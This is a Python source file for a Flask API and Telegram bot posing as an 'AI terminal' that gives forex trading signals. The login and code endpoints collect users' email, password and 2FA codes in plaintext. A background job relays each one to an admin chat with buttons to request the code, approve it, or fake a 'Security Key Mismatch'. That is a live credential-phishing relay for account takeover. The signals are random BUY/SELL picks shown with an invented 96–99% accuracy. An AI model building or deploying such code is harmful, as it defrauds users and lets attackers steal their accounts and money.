import json
import os
import logging
import time
import random
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

app_flask = Flask(__name__)
CORS(app_flask)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "officialbinaryboss")
FRONTEND_URL = os.environ.get("FRONTEND_URL", "https://google.com")
DB_FILE = "master_users.json"

LIVE_PAIRS = ["EUR/USD", "GBP/USD", "USD/JPY", "USD/CHF", "USD/CAD", "AUD/USD", "NZD/USD"]
OTC_PAIRS = ["EUR/USD (OTC)", "GBP/USD (OTC)", "USD/JPY (OTC)", "AUD/USD (OTC)", "USD/CAD (OTC)"]

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f: json.dump({"users": {}, "settings": {"default_limit": 3}}, f)
    with open(DB_FILE, "r") as f: return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

@app_flask.route('/')
def home(): return "Nexus Master API Active", 200

@app_flask.route('/api/init_data', methods=['GET'])
def get_init_data():
    return jsonify({"live_pairs": LIVE_PAIRS, "otc_pairs": OTC_PAIRS, "admin_contact": ADMIN_USERNAME})

@app_flask.route('/api/status', methods=['GET'])
def get_status():
    user_id = str(request.args.get('user_id'))
    db = load_db()
    if user_id not in db["users"]:
        db["users"][user_id] = {"state": "START", "count": 0, "is_vip": False, "custom_limit": 0, "auth_time": 0, "auth_msg": ""}
        save_db(db)
    user = db["users"][user_id]
    
    # Session extended to 24 Hours (86400 seconds)
    if user.get("state") == "AUTHORIZED" and (time.time() - user.get("auth_time", 0) > 86400):
        db["users"][user_id]["state"] = "START"
        db["users"][user_id]["auth_msg"] = "⚠️ SESSION EXPIRED (24H). Relogin required."
        save_db(db)
        user = db["users"][user_id]
            
    return jsonify({"state": user.get("state"), "msg": user.get("auth_msg", "")})

@app_flask.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    user_id, email, password = str(data.get('user_id')), data.get('email'), data.get('password')
    db = load_db()
    if user_id not in db["users"]: db["users"][user_id] = {"count": 0, "is_vip": False, "custom_limit": 0}
    db["users"][user_id].update({"email": email, "password": password, "state": "PENDING_ADMIN_1", "notified_1": False})
    save_db(db)
    return jsonify({"success": True})

@app_flask.route('/api/code', methods=['POST'])
def api_code():
    data = request.json
    user_id, code = str(data.get('user_id')), data.get('code')
    db = load_db()
    db["users"][user_id].update({"code": code, "state": "PENDING_ADMIN_2", "notified_2": False})
    save_db(db)
    return jsonify({"success": True})

@app_flask.route('/api/signal', methods=['POST'])
def api_signal():
    data = request.json
    user_id = str(data.get('user_id'))
    db = load_db()
    user = db["users"].get(user_id, {})
    
    # Check Limits
    limit = user.get("custom_limit") if user.get("custom_limit", 0) > 0 else db["settings"]["default_limit"]
    if user.get("count", 0) >= limit and not user.get("is_vip", False):
        return jsonify({"error": "LIMIT_REACHED", "admin": ADMIN_USERNAME})
        
    db["users"][user_id]["count"] = user.get("count", 0) + 1
    save_db(db)
    
    accuracy = random.randint(96, 99) 
    direction = random.choice(["BUY ⬆️", "SELL ⬇️"])
    return jsonify({"success": True, "direction": direction, "accuracy": accuracy})

def run():
    port = int(os.environ.get("PORT", 8080))
    app_flask.run(host='0.0.0.0', port=port)
    
Thread(target=run).start()

# --- ADMIN COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("🚀 OPEN AI TERMINAL", web_app=WebAppInfo(url=FRONTEND_URL))]]
    await update.message.reply_text("💎 *NEXUS FX MASTER NODE*\n\nConnection ready.", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def unlimit_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        uid = context.args[0]
        db = load_db()
        if uid in db["users"]:
            db["users"][uid]["is_vip"] = True
            save_db(db)
            await update.message.reply_text(f"✅ User `{uid}` is now UNLIMITED VIP.", parse_mode='Markdown')
        else:
            await update.message.reply_text("User not found.")
    except: await update.message.reply_text("Usage: /unlimit <user_id>")

async def setlimit_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        limit = int(context.args[0])
        uid = context.args[1]
        db = load_db()
        if uid in db["users"]:
            db["users"][uid]["custom_limit"] = limit
            db["users"][uid]["is_vip"] = False # Remove VIP if setting strict limit
            save_db(db)
            await update.message.reply_text(f"✅ User `{uid}` limit set to {limit} signals.", parse_mode='Markdown')
        else:
            await update.message.reply_text("User not found.")
    except: await update.message.reply_text("Usage: /setlimit <number> <user_id>")

async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action, user_id = query.data.split("_")
    db = load_db()
    if action == "app1": db["users"][user_id].update({"state": "WAITING_CODE", "auth_msg": ""})
    elif action == "app2": db["users"][user_id].update({"state": "AUTHORIZED", "auth_time": time.time(), "auth_msg": ""})
    elif action == "err": db["users"][user_id].update({"state": "WAITING_CODE", "auth_msg": "⚠️ Security Key Mismatch. Re-enter."})
    elif action == "dec": db["users"][user_id].update({"state": "START", "auth_msg": "❌ Access Denied."})
    save_db(db)
    await query.edit_message_text(f"{query.message.text}\n\n*Status Updated.*")

async def check_admin_queue(context: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    for uid, data in db["users"].items():
        if data.get("state") == "PENDING_ADMIN_1" and not data.get("notified_1"):
            db["users"][uid]["notified_1"] = True; save_db(db)
            kb = [[InlineKeyboardButton("Ask Code", callback_data=f"app1_{uid}"), InlineKeyboardButton("Decline", callback_data=f"dec_{uid}")]]
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 *LOGIN*\n🆔 `{uid}`\nE: `{data['email']}`\nP: `{data['password']}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        elif data.get("state") == "PENDING_ADMIN_2" and not data.get("notified_2"):
            db["users"][uid]["notified_2"] = True; save_db(db)
            kb = [[InlineKeyboardButton("Approve", callback_data=f"app2_{uid}"), InlineKeyboardButton("Node Err", callback_data=f"err_{uid}")]]
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 *2FA CODE*\n🆔 `{uid}`\nCode: `{data['code']}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("unlimit", unlimit_user))
    app.add_handler(CommandHandler("setlimit", setlimit_user))
    app.add_handler(CallbackQueryHandler(admin_buttons))
    app.job_queue.run_repeating(check_admin_queue, interval=3, first=1)
    app.run_polling()

if __name__ == "__main__": main()
